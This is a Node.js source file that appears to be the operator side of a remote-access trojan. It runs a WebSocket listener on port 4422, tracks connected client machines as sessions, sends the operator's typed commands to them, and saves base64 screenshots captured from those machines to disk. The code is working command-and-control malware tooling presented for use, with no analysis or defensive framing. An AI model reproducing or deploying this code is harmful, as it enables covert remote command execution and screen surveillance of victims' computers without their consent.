const WebSocket = require('ws');
const colors = require('colors');
var keypress = require('keypress');
keypress(process.stdin);
var pos = 1;
require('events').EventEmitter.setMaxListeners = 1;
var workingDir = "";
process.stdin.setRawMode(true);
process.stdin.resume();
cmdHistory = [""];
sessions = [];
currentSession = 0;
const wss = new WebSocket.Server({
	port: 4422
});

wss.on('connection', function connection(ws) {
	sessions.push(ws);
	currentSession = sessions.length - 1;
	console.log("[".white + "+".blue + "] Connected to client : ".white + ws._socket.remoteAddress.replace("::ffff:", "").underline.green + " !");
	ws.on('message', function incoming(message) {

		if (message.startsWith("hello")) {
			workingDir = message.substring(message.indexOf("##") + 2, message.lastIndexOf("##"));
			process.stdout.write(workingDir.bold.white + "> ".white);
		} else if (message.startsWith("##finish##")) {
			ws.send("#pwd");
		} else if (message.startsWith("##SCREENSHOT##")) {
			var base64Data = message.replace("##SCREENSHOT##", "").replace(/^data:image\/png;base64,/, "");
			require("fs").writeFile("screenshots/" + Date.now() + ".png", base64Data, 'base64', function (err) {});
		} else {
			console.log(message.grey);
		}
	});
	ws.on('close', function (reasonCode, description) {
		console.log((new Date()) + ' Peer ' + ws.remoteAddress + ' disconnected.');
	});

});

process.stdin.on("keypress", function (ch, key) {
	if (key && key.name == "up") {
		if (pos + 1 <= cmdHistory.length) {
			pos++;
			process.stdout.clearLine();
			process.stdout.cursorTo(0);
			process.stdout.write(workingDir.bold.white + "> ".white + cmdHistory[cmdHistory.length - pos]);
		}
	} else if (key && key.name == "down") {
		if (pos - 1 > 0) {
			pos--;
			process.stdout.clearLine();
			process.stdout.cursorTo(0);
			process.stdout.write(workingDir.bold.white + "> ".white + cmdHistory[cmdHistory.length - pos]);
		}
	} else if (key && key.ctrl && key.name == 'c') {
		process.exit()
	} else if (key && key.name == "return") {
		process.stdout.clearLine();
		process.stdout.cursorTo(0);
		process.stdout.write(workingDir.bold.white + "> ".white + cmdHistory[cmdHistory.length - pos] + "\n");
		sessions[currentSession].send(cmdHistory[cmdHistory.length - pos]);
		if (cmdHistory[cmdHistory.length - 1] == "screenshot") {
			console.log("[".white + "+".blue + "]".white + "Uploading screenshot (May exceed 10MO, please be patient)...".bold);
		}
		if (pos == 1) cmdHistory[cmdHistory.length] = "";
		pos = 1;

	} else {
		if (key != undefined) {
			cmdHistory[cmdHistory.length - 1] += key.sequence;
		} else {
			cmdHistory[cmdHistory.length - 1] += ch;
		}
		process.stdout.clearLine();
		process.stdout.cursorTo(0);
		process.stdout.write(workingDir.bold.white + "> ".white + cmdHistory[cmdHistory.length - pos]);
	}
});